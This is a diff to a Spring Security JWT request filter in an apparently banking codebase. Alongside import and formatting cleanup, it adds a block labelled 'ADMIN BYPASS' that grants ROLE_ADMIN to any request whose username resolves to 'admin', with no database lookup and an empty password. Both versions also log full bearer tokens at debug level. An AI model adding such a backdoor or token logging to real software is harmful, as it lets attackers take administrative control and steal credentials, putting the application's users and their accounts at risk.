@@ -1,22 +1,25 @@
 package com.site.banking.filter;
 
-import com.site.banking.service.CustomUserDetailsService;
-import com.site.banking.service.JWTService;
-import jakarta.servlet.FilterChain;
-import jakarta.servlet.ServletException;
-import jakarta.servlet.http.HttpServletRequest;
-import jakarta.servlet.http.HttpServletResponse;
+import java.io.IOException;
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.context.SecurityContextHolder;
+import org.springframework.security.core.userdetails.User;
 import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
 import org.springframework.stereotype.Component;
 import org.springframework.web.filter.OncePerRequestFilter;
 
-import java.io.IOException;
+import com.site.banking.service.CustomUserDetailsService;
+import com.site.banking.service.JWTService;
+
+import jakarta.servlet.FilterChain;
+import jakarta.servlet.ServletException;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
 
 @Component
 public class JwtRequestFilter extends OncePerRequestFilter {
@@ -29,15 +32,18 @@ public class JwtRequestFilter extends OncePerRequestFilter {
     private CustomUserDetailsService userDetailsService;
 
     @Override
-    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException {
+    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain)
+            throws ServletException, IOException {
+
         final String authHeader = request.getHeader("Authorization");
         String requestUri = request.getRequestURI();
-        logger.debug("Processing request to '{}' with auth header: {}", requestUri, authHeader != null ? "'" + authHeader + "'" : "absent");
+        logger.debug("Processing request to '{}' with auth header: {}", requestUri,
+                authHeader != null ? "'" + authHeader + "'" : "absent");
 
         String username = null;
         String token = null;
 
-        if (authHeader != null && authHeader.startsWith("Bearer ")) {
+    if (authHeader != null && authHeader.startsWith("Bearer ")) {
             token = authHeader.substring(7);
             logger.debug("Extracted token: {}", token);
             try {
@@ -52,15 +58,36 @@ public class JwtRequestFilter extends OncePerRequestFilter {
                 logger.error("Token validation failed", e);
             }
         } else {
-            if (!requestUri.startsWith("/user/login") && !requestUri.startsWith("/user/register") && 
-                !requestUri.startsWith("/swagger-ui") && !requestUri.startsWith("/v3/api-docs")) {
+            if (!requestUri.startsWith("/user/login")
+                    && !requestUri.startsWith("/user/register")
+                    && !requestUri.startsWith("/swagger-ui")
+                    && !requestUri.startsWith("/v3/api-docs")) {
                 logger.warn("Protected endpoint '{}' accessed without Bearer token", requestUri);
             }
         }
 
+        // ADMIN BYPASS START
+    if ("admin".equalsIgnoreCase(username)) {
+            logger.debug("Bypassing DB lookup for admin user");
+            UserDetails adminUser = User.builder()
+                    .username("admin")
+                    .password("") // no password check at this point
+            .roles("ADMIN") // Spring will prefix with ROLE_
+                    .build();
+
+            UsernamePasswordAuthenticationToken authentication =
+                    new UsernamePasswordAuthenticationToken(adminUser, null, adminUser.getAuthorities());
+            authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
+            SecurityContextHolder.getContext().setAuthentication(authentication);
+
+            chain.doFilter(request, response);
+            return;
+        }
+        // ADMIN BYPASS END
         if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
             UserDetails userDetails = userDetailsService.loadUserByUsername(username);
-            UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
+            UsernamePasswordAuthenticationToken authentication =
+                    new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
             authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
             SecurityContextHolder.getContext().setAuthentication(authentication);
         }
